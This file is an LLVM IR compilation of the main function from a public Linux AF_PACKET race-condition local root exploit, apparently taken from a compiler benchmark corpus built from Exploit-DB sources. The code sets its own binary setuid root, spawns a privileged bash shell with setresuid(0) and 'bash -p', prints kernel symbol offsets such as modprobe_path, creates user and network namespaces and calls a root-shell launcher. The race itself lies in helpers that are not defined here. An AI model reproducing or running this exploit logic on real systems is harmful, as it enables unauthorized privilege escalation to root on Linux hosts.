; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_40871.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_40871.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i8*, i64, i32, i64, i64 }
%struct.utsname = type { i8*, i8* }

@.str = private unnamed_addr constant [6 x i8] c"crash\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"/proc/self/exe\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"bash\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"-p\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [49 x i8] c"linux AF_PACKET race condition exploit by rebel\0A\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"-Ubuntu\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@.str.8 = private unnamed_addr constant [20 x i8] c"kernel version: %s\0A\00", align 1
@offsets = common dso_local global %struct.TYPE_3__* null, align 8
@off = common dso_local global %struct.TYPE_3__* null, align 8
@.str.9 = private unnamed_addr constant [20 x i8] c"proc_dostring = %p\0A\00", align 1
@.str.10 = private unnamed_addr constant [20 x i8] c"modprobe_path = %p\0A\00", align 1
@.str.11 = private unnamed_addr constant [28 x i8] c"register_sysctl_table = %p\0A\00", align 1
@.str.12 = private unnamed_addr constant [20 x i8] c"set_memory_rw = %p\0A\00", align 1
@.str.13 = private unnamed_addr constant [45 x i8] c"i have no offsets for this kernel version..\0A\00", align 1
@CLONE_NEWUSER = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [37 x i8] c"failed to create new user namespace\0A\00", align 1
@CLONE_NEWNET = common dso_local global i32 0, align 4
@.str.15 = private unnamed_addr constant [40 x i8] c"failed to create new network namespace\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.utsname, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [512 x i8], align 16
  %12 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %10, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, 2
  br i1 %14, label %15, label %22

15:                                               ; preds = %2
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 1
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 @strcmp(i8* %18, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %22, label %21

21:                                               ; preds = %15
  store i32 1, i32* %10, align 4
  br label %22

22:                                               ; preds = %21, %15, %2
  %23 = call i64 (...) @getuid()
  %24 = icmp eq i64 %23, 0
  br i1 %24, label %25, label %35

25:                                               ; preds = %22
  %26 = call i64 (...) @geteuid()
  %27 = icmp eq i64 %26, 0
  br i1 %27, label %28, label %35

28:                                               ; preds = %25
  %29 = load i32, i32* %10, align 4
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %35, label %31

31:                                               ; preds = %28
  %32 = call i32 @chown(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i32 0, i32 0)
  %33 = call i32 @chmod(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i32 3565)
  %34 = call i32 @exit(i32 -1) #3
  unreachable

35:                                               ; preds = %28, %25, %22
  %36 = call i64 (...) @getuid()
  %37 = icmp ne i64 %36, 0
  br i1 %37, label %38, label %49

38:                                               ; preds = %35
  %39 = call i64 (...) @geteuid()
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %41, label %49

41:                                               ; preds = %38
  %42 = load i32, i32* %10, align 4
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %49, label %44

44:                                               ; preds = %41
  %45 = call i32 @setresuid(i32 0, i32 0, i32 0)
  %46 = call i32 @setresgid(i32 0, i32 0, i32 0)
  %47 = call i32 @execl(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32* null)
  %48 = call i32 @exit(i32 0) #3
  unreachable

49:                                               ; preds = %41, %38, %35
  br label %50

50:                                               ; preds = %49
  %51 = load i32, i32* @stderr, align 4
  %52 = call i32 @fprintf(i32 %51, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.5, i64 0, i64 0))
  %53 = call i32 @uname(%struct.utsname* %8)
  %54 = getelementptr inbounds %struct.utsname, %struct.utsname* %8, i32 0, i32 0
  %55 = load i8*, i8** %54, align 8
  %56 = call i8* @strstr(i8* %55, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0))
  store i8* %56, i8** %12, align 8
  %57 = icmp ne i8* %56, null
  br i1 %57, label %58, label %60

58:                                               ; preds = %50
  %59 = load i8*, i8** %12, align 8
  store i8 0, i8* %59, align 1
  br label %60

60:                                               ; preds = %58, %50
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %62 = getelementptr inbounds %struct.utsname, %struct.utsname* %8, i32 0, i32 1
  %63 = load i8*, i8** %62, align 8
  %64 = getelementptr inbounds %struct.utsname, %struct.utsname* %8, i32 0, i32 0
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @snprintf(i8* %61, i32 512, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i8* %63, i8* %65)
  %67 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %68 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.8, i64 0, i64 0), i8* %67)
  store i32 0, i32* %9, align 4
  br label %69

69:                                               ; preds = %105, %60
  %70 = load %struct.TYPE_3__*, %struct.TYPE_3__** @offsets, align 8
  %71 = load i32, i32* %9, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %70, i64 %72
  %74 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = icmp ne i8* %75, null
  br i1 %76, label %77, label %108

77:                                               ; preds = %69
  %78 = load %struct.TYPE_3__*, %struct.TYPE_3__** @offsets, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %78, i64 %80
  %82 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %81, i32 0, i32 0
  %83 = load i8*, i8** %82, align 8
  %84 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %85 = call i32 @strcmp(i8* %83, i8* %84)
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %104, label %87

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %96, %87
  %89 = load %struct.TYPE_3__*, %struct.TYPE_3__** @offsets, align 8
  %90 = load i32, i32* %9, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %89, i64 %91
  %93 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %92, i32 0, i32 1
  %94 = load i64, i64* %93, align 8
  %95 = icmp eq i64 %94, 0
  br i1 %95, label %96, label %99

96:                                               ; preds = %88
  %97 = load i32, i32* %9, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %9, align 4
  br label %88

99:                                               ; preds = %88
  %100 = load %struct.TYPE_3__*, %struct.TYPE_3__** @offsets, align 8
  %101 = load i32, i32* %9, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %100, i64 %102
  store %struct.TYPE_3__* %103, %struct.TYPE_3__** @off, align 8
  br label %108

104:                                              ; preds = %77
  br label %105

105:                                              ; preds = %104
  %106 = load i32, i32* %9, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* %9, align 4
  br label %69

108:                                              ; preds = %99, %69
  %109 = load i32, i32* %10, align 4
  %110 = icmp ne i32 %109, 0
  br i1 %110, label %111, label %116

111:                                              ; preds = %108
  %112 = load %struct.TYPE_3__*, %struct.TYPE_3__** @offsets, align 8
  %113 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %112, i64 0
  store %struct.TYPE_3__* %113, %struct.TYPE_3__** @off, align 8
  %114 = load %struct.TYPE_3__*, %struct.TYPE_3__** @off, align 8
  %115 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %114, i32 0, i32 2
  store i32 1094795585, i32* %115, align 8
  br label %116

116:                                              ; preds = %111, %108
  %117 = load %struct.TYPE_3__*, %struct.TYPE_3__** @off, align 8
  %118 = icmp ne %struct.TYPE_3__* %117, null
  br i1 %118, label %119, label %141

119:                                              ; preds = %116
  %120 = load %struct.TYPE_3__*, %struct.TYPE_3__** @off, align 8
  %121 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %120, i32 0, i32 1
  %122 = load i64, i64* %121, align 8
  %123 = inttoptr i64 %122 to i8*
  %124 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.9, i64 0, i64 0), i8* %123)
  %125 = load %struct.TYPE_3__*, %struct.TYPE_3__** @off, align 8
  %126 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %125, i32 0, i32 4
  %127 = load i64, i64* %126, align 8
  %128 = inttoptr i64 %127 to i8*
  %129 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.10, i64 0, i64 0), i8* %128)
  %130 = load %struct.TYPE_3__*, %struct.TYPE_3__** @off, align 8
  %131 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %130, i32 0, i32 3
  %132 = load i64, i64* %131, align 8
  %133 = inttoptr i64 %132 to i8*
  %134 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.11, i64 0, i64 0), i8* %133)
  %135 = load %struct.TYPE_3__*, %struct.TYPE_3__** @off, align 8
  %136 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %135, i32 0, i32 2
  %137 = load i32, i32* %136, align 8
  %138 = sext i32 %137 to i64
  %139 = inttoptr i64 %138 to i8*
  %140 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.12, i64 0, i64 0), i8* %139)
  br label %141

141:                                              ; preds = %119, %116
  %142 = load %struct.TYPE_3__*, %struct.TYPE_3__** @off, align 8
  %143 = icmp ne %struct.TYPE_3__* %142, null
  br i1 %143, label %148, label %144

144:                                              ; preds = %141
  %145 = load i32, i32* @stderr, align 4
  %146 = call i32 @fprintf(i32 %145, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.13, i64 0, i64 0))
  %147 = call i32 @exit(i32 -1) #3
  unreachable

148:                                              ; preds = %141
  %149 = call i32 (...) @fork()
  store i32 %149, i32* %7, align 4
  %150 = load i32, i32* %7, align 4
  %151 = icmp eq i32 %150, 0
  br i1 %151, label %152, label %169

152:                                              ; preds = %148
  %153 = load i32, i32* @CLONE_NEWUSER, align 4
  %154 = call i64 @unshare(i32 %153)
  %155 = icmp ne i64 %154, 0
  br i1 %155, label %156, label %159

156:                                              ; preds = %152
  %157 = load i32, i32* @stderr, align 4
  %158 = call i32 @fprintf(i32 %157, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.14, i64 0, i64 0))
  br label %159

159:                                              ; preds = %156, %152
  %160 = load i32, i32* @CLONE_NEWNET, align 4
  %161 = call i64 @unshare(i32 %160)
  %162 = icmp ne i64 %161, 0
  br i1 %162, label %163, label %166

163:                                              ; preds = %159
  %164 = load i32, i32* @stderr, align 4
  %165 = call i32 @fprintf(i32 %164, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.15, i64 0, i64 0))
  br label %166

166:                                              ; preds = %163, %159
  %167 = call i32 (...) @wrapper()
  %168 = call i32 @exit(i32 0) #3
  unreachable

169:                                              ; preds = %148
  %170 = load i32, i32* %7, align 4
  %171 = call i32 @waitpid(i32 %170, i32* %6, i32 0)
  %172 = call i32 (...) @launch_rootshell()
  ret i32 0
}

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i64 @getuid(...) #1

declare dso_local i64 @geteuid(...) #1

declare dso_local i32 @chown(i8*, i32, i32) #1

declare dso_local i32 @chmod(i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @setresuid(i32, i32, i32) #1

declare dso_local i32 @setresgid(i32, i32, i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @uname(%struct.utsname*) #1

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, i8*) #1

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i64 @unshare(i32) #1

declare dso_local i32 @wrapper(...) #1

declare dso_local i32 @waitpid(i32, i32*, i32) #1

declare dso_local i32 @launch_rootshell(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
